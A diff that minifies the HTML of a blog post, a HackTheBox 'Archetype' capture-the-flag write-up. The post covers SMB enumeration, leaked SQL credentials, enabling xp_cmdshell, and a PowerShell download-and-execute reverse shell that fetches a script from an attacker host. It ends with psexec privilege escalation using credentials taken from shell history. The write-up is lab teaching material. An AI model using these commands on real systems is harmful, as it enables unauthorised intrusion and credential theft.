@@ -1,46 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>Mannthan</title>
-    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
-    <script src="/static/js/highlight.min.js"></script>
-    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/style.md.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
-    <link rel="stylesheet" href="/static/css/github-gist.min.css">
-    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
-   </head>
-  <body>
-    <div class="header">
-      <table>
-        <tr>
-          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
-          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
-          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
-          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
-        </tr>
-      </table>
-    </div>
-    <div class="body">
-          <h1 class="h1 collapsible" onclick="toggle(this);">[HackTheBox] Archetype</h1>
-                  <p><a href="/posts/20191113_htb-blocky.html"> « </a>📅 published on <code>28/Apr/2020</code><a href="/posts/20200625_htb-bashed.html"> » </a></p>
-                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
-<p class="nested"><img alt="writeup.metadata.infocard" src="/static/files/posts_htb_archetype/infocard.png" /></p>
-<p class="nested">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/start">Archetype</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
-<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_archetype/killchain.png" /></p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
-<p class="nested">1. Here's the Nmap scan result:  </p>
-<pre class="nested"><code># Nmap 7.70 scan initiated Tue Apr 28 07:55:10 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.archetype/results/10.10.10.27/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.archetype/results/10.10.10.27/scans/xml/_quick_tcp_nmap.xml 10.10.10.27
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[HackTheBox] Archetype</h1><p><a href=/posts/20191113_htb-blocky.html> « </a>📅 published on <code>28/Apr/2020</code><a href=/posts/20200625_htb-bashed.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested><img alt=writeup.metadata.infocard src=/static/files/posts_htb_archetype/infocard.png></p><p class=nested>This is a writeup for HTB VM <a href=https://www.hackthebox.eu/home/start>Archetype</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_htb_archetype/killchain.png></p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Tue Apr 28 07:55:10 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.archetype/results/10.10.10.27/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.archetype/results/10.10.10.27/scans/xml/_quick_tcp_nmap.xml 10.10.10.27
 Increasing send delay for 10.10.10.27 from 0 to 5 due to 32 out of 106 dropped probes since last increase.
 Nmap scan report for 10.10.10.27
 Host is up, received user-set (0.29s latency).
@@ -127,23 +85,9 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Apr 28 07:56:23 2020 -- 1 IP address (1 host up) scanned in 73.83 seconds
-</code></pre>
-
-<p class="nested">2. We find <code>445/tcp</code> to be open and can use <code>smbclient</code> to check if it allows anonymous access:  </p>
-<pre class="nested"><code>smbclient -N -L \\\\10.10.10.27
-</code></pre>
-
-<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_archetype/screenshot01.png" />  </p>
-<p class="nested">3. We find a non-default share named <code>backups</code> which seems interesting. Let's explore further:  </p>
-<pre class="nested"><code>smbclient -N \\\\10.10.10.27\\backups
-</code></pre>
-
-<p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_archetype/screenshot02.png" />  </p>
-<p class="nested">4. We find a <code>prod.dtsConfig</code> file on the SMB share. The <code>.dtsConfig</code> files are used by <a href="https://en.wikipedia.org/wiki/SQL_Server_Integration_Services">SQL Server Integration Services (SSIS)</a>. We find that this file contains plaintext credentials for the default SQL service user:  </p>
-<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_archetype/screenshot03.png" />  </p>
-<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
-<pre class="nested"><code>135/tcp    msrpc         Microsoft Windows RPC
+</code></pre><p class=nested>2. We find <code>445/tcp</code> to be open and can use <code>smbclient</code> to check if it allows anonymous access: </p><pre class=nested><code>smbclient -N -L \\\\10.10.10.27
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_htb_archetype/screenshot01.png> </p><p class=nested>3. We find a non-default share named <code>backups</code> which seems interesting. Let's explore further: </p><pre class=nested><code>smbclient -N \\\\10.10.10.27\\backups
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_htb_archetype/screenshot02.png> </p><p class=nested>4. We find a <code>prod.dtsConfig</code> file on the SMB share. The <code>.dtsConfig</code> files are used by <a href=https://en.wikipedia.org/wiki/SQL_Server_Integration_Services>SQL Server Integration Services (SSIS)</a>. We find that this file contains plaintext credentials for the default SQL service user: </p><p class=nested><img alt=writeup.enumeration.steps.4.1 src=/static/files/posts_htb_archetype/screenshot03.png> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>135/tcp    msrpc         Microsoft Windows RPC
 139/tcp    netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp    microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
 1433/tcp   ms-sql-s      Microsoft SQL Server 14.00.1000.00
@@ -155,56 +99,24 @@ Service detection performed. Please report any incorrect results at https://nmap
 49667/tcp  msrpc         Microsoft Windows RPC
 49668/tcp  msrpc         Microsoft Windows RPC
 49669/tcp  msrpc         Microsoft Windows RPC
-</code></pre>
-
-<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
-<pre class="nested"><code>prod.dtsConfig
-</code></pre>
-
-<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
-<pre class="nested"><code>sql: sql_svc
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
-<p class="nested">1. Since the <code>1443/tcp</code> port is open for SQL service and we also have credentials for the default user, let's connect to the remote service and explore further:  </p>
-<pre class="nested"><code>mssqlclient.py -windows-auth &quot;sql_svc@10.10.10.27&quot;
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_archetype/screenshot04.png" />  </p>
-<p class="nested">2. We find that the user has <code>sysadmin</code> access (highest access level on SQL server) using the <code>IS_SRVROLEMEMBER</code> function. This allows us to enable <code>xp_cmdshell</code> to gain command execution:  </p>
-<pre class="nested"><code>SELECT IS_SRVROLEMEMBER('sysadmin')
+</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Files</h4><pre class=nested><code>prod.dtsConfig
+</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Users</h4><pre class=nested><code>sql: sql_svc
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. Since the <code>1443/tcp</code> port is open for SQL service and we also have credentials for the default user, let's connect to the remote service and explore further: </p><pre class=nested><code>mssqlclient.py -windows-auth &quot;sql_svc@10.10.10.27&quot;
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_htb_archetype/screenshot04.png> </p><p class=nested>2. We find that the user has <code>sysadmin</code> access (highest access level on SQL server) using the <code>IS_SRVROLEMEMBER</code> function. This allows us to enable <code>xp_cmdshell</code> to gain command execution: </p><pre class=nested><code>SELECT IS_SRVROLEMEMBER('sysadmin')
 
 EXEC sp_configure 'Show Advanced Options', 1;
 reconfigure;
 sp_configure;
 EXEC sp_configure 'xp_cmdshell', 1
 reconfigure;
-</code></pre>
-
-<p class="nested">3. Let's run the <code>whoami</code> command using the <code>xp_cmdshell</code> method and check our current privileges. We find that our current user <code>sql_svc</code> lacks <code>Administrator</code> access on the system:  </p>
-<pre class="nested"><code>xp_cmdshell &quot;whoami&quot;
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_htb_archetype/screenshot05.png" />  </p>
-<p class="nested">4. Let's deploy a Powershell reverse shell on the system using <code>xp_cmdshell</code> to gain interactive access on the system:  </p>
-<pre class="nested"><code>type shell.ps1
+</code></pre><p class=nested>3. Let's run the <code>whoami</code> command using the <code>xp_cmdshell</code> method and check our current privileges. We find that our current user <code>sql_svc</code> lacks <code>Administrator</code> access on the system: </p><pre class=nested><code>xp_cmdshell &quot;whoami&quot;
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.3.1 src=/static/files/posts_htb_archetype/screenshot05.png> </p><p class=nested>4. Let's deploy a Powershell reverse shell on the system using <code>xp_cmdshell</code> to gain interactive access on the system: </p><pre class=nested><code>type shell.ps1
   xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.33/shell.ps1\&quot;);&quot;
 python3 -m http.server 80
 ufw allow from 10.10.10.27 proto tcp to any port 80,443
 nc -nlvp 443
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_htb_archetype/screenshot06.png" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.4.2" src="/static/files/posts_htb_archetype/screenshot07.png" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.4.3" src="/static/files/posts_htb_archetype/screenshot08.png" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.4.4" src="/static/files/posts_htb_archetype/screenshot09.png" />  </p>
-<p class="nested">5. We can now read the <code>user.txt</code> flag:  </p>
-<pre class="nested"><code>type C:\Users\sql_svc\Desktop\user.txt
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.5.1" src="/static/files/posts_htb_archetype/screenshot10.png" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<pre class="nested"><code>sql_svc@ARCHETYPE&gt; id
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.4.1 src=/static/files/posts_htb_archetype/screenshot06.png> </p><p class=nested><img alt=writeup.exploitation.steps.4.2 src=/static/files/posts_htb_archetype/screenshot07.png> </p><p class=nested><img alt=writeup.exploitation.steps.4.3 src=/static/files/posts_htb_archetype/screenshot08.png> </p><p class=nested><img alt=writeup.exploitation.steps.4.4 src=/static/files/posts_htb_archetype/screenshot09.png> </p><p class=nested>5. We can now read the <code>user.txt</code> flag: </p><pre class=nested><code>type C:\Users\sql_svc\Desktop\user.txt
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.5.1 src=/static/files/posts_htb_archetype/screenshot10.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>sql_svc@ARCHETYPE&gt; id
 archetype\sql_svc
 sql_svc@ARCHETYPE&gt;  
 sql_svc@ARCHETYPE&gt; uname
@@ -227,72 +139,11 @@ sql_svc@ARCHETYPE&gt;
 sql_svc@ARCHETYPE&gt; users
 sql_svc
 Administrator
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
-<p class="nested">1. With our interactive shell running, we can now begin exploring the system further. Since the current user is a normal as well as service axxount, let's look at the Powershell history file to find any interesting commands:  </p>
-<pre class="nested"><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_archetype/screenshot11.png" />  </p>
-<p class="nested">2. We find that the <code>backups</code> drive has been mounted using administrative privileges and the credentials are leaked in plaintext within the history file. We can use these credentials to gain elevated access on the system:  </p>
-<pre class="nested"><code>psexec.py administrator@10.10.10.27
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_archetype/screenshot12.png" />  </p>
-<p class="nested">3. We can now read the <code>root.txt</code> flag:  </p>
-<pre class="nested"><code>type C:\Users\Administrator\Desktop\root.txt
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_archetype/screenshot13.png" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
-<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<pre class="nested"><code>ssh: administrator/MEGACORP_4......
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. With our interactive shell running, we can now begin exploring the system further. Since the current user is a normal as well as service axxount, let's look at the Powershell history file to find any interesting commands: </p><pre class=nested><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_htb_archetype/screenshot11.png> </p><p class=nested>2. We find that the <code>backups</code> drive has been mounted using administrative privileges and the credentials are leaked in plaintext within the history file. We can use these credentials to gain elevated access on the system: </p><pre class=nested><code>psexec.py administrator@10.10.10.27
+</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_htb_archetype/screenshot12.png> </p><p class=nested>3. We can now read the <code>root.txt</code> flag: </p><pre class=nested><code>type C:\Users\Administrator\Desktop\root.txt
+</code></pre><p class=nested><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_htb_archetype/screenshot13.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Credentials</h3><pre class=nested><code>ssh: administrator/MEGACORP_4......
 sql: sql_svc/M3g4c0r....
-</code></pre>
-
-<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
-<pre class="nested"><code>C:\Users\sql_svc\Desktop\user.txt: 3e7b102e78218e935bf.............
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Flags</h3><pre class=nested><code>C:\Users\sql_svc\Desktop\user.txt: 3e7b102e78218e935bf.............
 C:\Users\Administrator\Desktop\root.txt: b91ccec3305e982400..............
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
-<ul class="nested">
-<li><a href="https://www.hackthebox.eu/home/start">https://www.hackthebox.eu/home/start</a>  </li>
-</ul>
-        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p style="text-align:center;">« <a href="/posts/20191113_htb-blocky.html">[HackTheBox] Blocky...</a> « | » <a href="/posts/20200625_htb-bashed.html">[HackTheBox] Bashed...</a> »</p>
-            </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(elem) {
-        elem.classList.toggle("expanded");
-        var ish2=false; var ish3=false; var ish4=false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
-        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
-        var sibling = elem.nextElementSibling;
-        while (sibling) {
-          if (ish2 && sibling.classList.contains("h2")) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (sibling.classList.contains("collapsible")) {
-            sibling.classList.toggle("expanded");
-          }
-          sibling.classList.toggle("active");
-          sibling = sibling.nextElementSibling;
-        }
-      }
-    </script>
-    <div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div>
-  </body>
-</html>
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.hackthebox.eu/home/start>https://www.hackthebox.eu/home/start</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20191113_htb-blocky.html>[HackTheBox] Blocky...</a> « | » <a href=/posts/20200625_htb-bashed.html>[HackTheBox] Bashed...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div></body></html>
